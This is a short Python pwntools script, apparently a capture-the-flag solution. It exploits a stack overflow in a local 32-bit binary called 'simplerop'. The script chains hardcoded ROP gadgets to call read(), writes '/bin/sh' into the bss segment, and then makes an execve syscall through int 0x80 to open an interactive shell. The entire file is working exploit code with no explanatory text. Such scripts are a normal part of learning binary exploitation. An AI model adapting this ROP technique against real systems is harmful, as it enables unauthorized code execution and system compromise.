# coding:utf-8

from pwn import *
from LibcSearcher import *

context(os='linux', arch='i386', log_level='debug')

proc_name = 'simplerop'
p = process(proc_name)
elf = ELF(proc_name)

#gdb.attach(p)
padding = 'a' * 0x1C
fake_ebp = 'jkjk'
int_0x80_addr = 0x080493e1
pop_eax_ret = 0x080bae06
pop_edx_ecx_ebx_ret = 0x0806e850
bss_addr = 0x080EB000
read_addr = 0x0806CD50
##################### read ######################
payload = 'a' * 0x20
payload += p32(read_addr) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(bss_addr) + p32(8)
##################### system('/bin/sh') ####################
payload += p32(pop_eax_ret) + p32(0xb)
payload += p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bss_addr)
payload += p32(int_0x80_addr)

p.recv()
p.sendline(payload)
p.send('/bin/sh\x00')
p.interactive()

